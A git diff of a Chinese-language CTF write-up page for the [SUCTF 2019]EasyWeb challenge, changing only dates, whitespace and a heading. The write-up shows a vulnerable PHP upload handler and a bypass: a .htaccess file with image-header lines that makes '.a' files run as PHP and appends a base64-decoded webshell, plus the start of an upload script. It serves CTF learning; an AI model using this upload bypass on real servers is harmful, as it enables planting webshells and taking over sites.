@@ -513,7 +513,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-19
+                    2021-08-24
                 </div>
                 
 
@@ -550,11 +550,11 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="刷题笔记-SUCTF-2019-EasyWeb"><a href="#刷题笔记-SUCTF-2019-EasyWeb" class="headerlink" title="刷题笔记:[SUCTF 2019]EasyWeb"></a>刷题笔记:[SUCTF 2019]EasyWeb</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是一道做过的题。easy，但不完全easy。</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是一道做过的题。easy，但不完全easy。</p>
 <p>代码审计题</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">function</span> <span class="token function-definition function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token comment">// webadmin will remove your upload file every 20 min!!!! </span>
+    <span class="token comment">// webadmin will remove your upload file every 20 min!!!!</span>
     <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/tmp_"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -563,9 +563,9 @@
         <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
         <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
         <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>
         @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -639,12 +639,12 @@ jstr <span class="token operator">=</span> <span class="token string">''</span>
 <p><code>exif_imagetype</code>第一反应肯定是图片马，所以考虑图片马构造，但<code>&lt;?</code>被限制，导致大部分一句话木马都被过滤了，而<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>又只能在php5环境下使用</p>
 <p>所以将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码</p>
 <h4 id="htaccess-文件头检测绕过"><a href="#htaccess-文件头检测绕过" class="headerlink" title=".htaccess+文件头检测绕过"></a>.htaccess+文件头检测绕过</h4><p>因为有<code>exif_imagetype</code>进行文件头检测，一般是加<code>GIF89a</code>进行绕过，但在这里会导致<code>.htaccess</code>文件无法正常生效，所以在<code>.htaccess</code>文件中加上</p>
-<pre class="line-numbers language-none"><code class="language-none">#define width 1337 
+<pre class="line-numbers language-none"><code class="language-none">#define width 1337
 #define height 1337<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>于是<code>.htaccess</code>文件内容如下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#define width 1337</span>
-<span class="token comment">#define height 1337 </span>
+<span class="token comment">#define height 1337</span>
 AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>a
 php_value auto_append_file <span class="token string double-quoted-string">"php://filter/convert.base64-decode/resource=./shell.a"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
@@ -664,7 +664,7 @@ url <span class="token operator">=</span> <span class="token string">r"http://7c
 session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
 htaccess_content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
 #define width 1337
-#define height 1337 
+#define height 1337
 AddType application/x-httpd-php .a
 php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.a"
 '''</span>
